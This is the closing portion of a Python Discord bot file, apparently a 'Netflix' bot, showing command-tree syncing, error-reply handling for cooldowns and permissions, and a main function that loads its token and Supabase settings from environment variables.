                await self.tree.sync(guild=g)
                print(f"[Bot] Commands synced to guild {guild_id}.")
            except Exception as e:
                print(f"[Bot] Guild sync failed ({e}). Falling back to global.")
                self.tree.clear_commands(guild=None)
                await self.tree.sync()
                print("[Bot] Commands synced globally (up to 1 hour to appear).")
        else:
            self.tree.clear_commands(guild=None)
            await self.tree.sync()
            print("[Bot] Commands synced globally (up to 1 hour to appear).")

    async def on_ready(self):
        print(f"[Bot] ✅ Logged in as {self.user} (ID: {self.user.id})")
        print("[Bot] 🟢 Your bot is Live")
        await self.change_presence(activity=discord.Game(name="Netflix 🎬"))

    async def _on_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        async def reply(msg: str):
            try:
                if interaction.response.is_done():
                    await interaction.followup.send(msg, ephemeral=True)
                else:
                    await interaction.response.send_message(msg, ephemeral=True)
            except Exception:
                pass

        if isinstance(error, app_commands.CheckFailure):
            msg = str(error)
            await reply(msg if msg and "check functions" not in msg.lower()
                        else "❌ You can't use this command here.")
        elif isinstance(error, app_commands.CommandOnCooldown):
            h, rem = divmod(int(error.retry_after), 3600)
            m, s   = divmod(rem, 60)
            parts  = ([f"{h}h"] if h else []) + ([f"{m}m"] if m else []) + ([f"{s}s"] if s or not (h or m) else [])
            await reply(f"⏳ Cooldown! Try again in **{' '.join(parts)}**.")
        elif isinstance(error, app_commands.MissingPermissions):
            await reply("❌ You need **Administrator** permission.")
        else:
            print(f"[Bot] Error: {type(error).__name__}: {error}")
            await reply(f"⚠️ Unexpected error: `{type(error).__name__}`")


# ==========================================
# 8. ENTRY POINT
# ==========================================

def main():
    token = os.environ.get("DISCORD_BOT_TOKEN", "").strip()
    if not token:
        sys.exit("[Bot] FATAL: DISCORD_BOT_TOKEN is not set.")
    if not os.environ.get("SUPABASE_URL") or not os.environ.get("SUPABASE_KEY"):
        sys.exit("[Bot] FATAL: SUPABASE_URL and SUPABASE_KEY must be set.")

    print("[Bot] Starting Netflix Discord Bot…")
    print(f"[Bot] Channels — ADMIN:{ADMIN_CHANNEL_ID} FGEN:{FGEN_CHANNEL_ID} "
          f"BGEN:{BGEN_CHANNEL_ID} PGEN:{PGEN_CHANNEL_ID}")

    bot = NetflixBot()
    try:
        bot.run(token)
    except discord.LoginFailure:
        sys.exit("[Bot] FATAL: Invalid DISCORD_BOT_TOKEN.")
    except Exception as e:
        sys.exit(f"[Bot] FATAL: {e}")


if __name__ == "__main__":
    main()
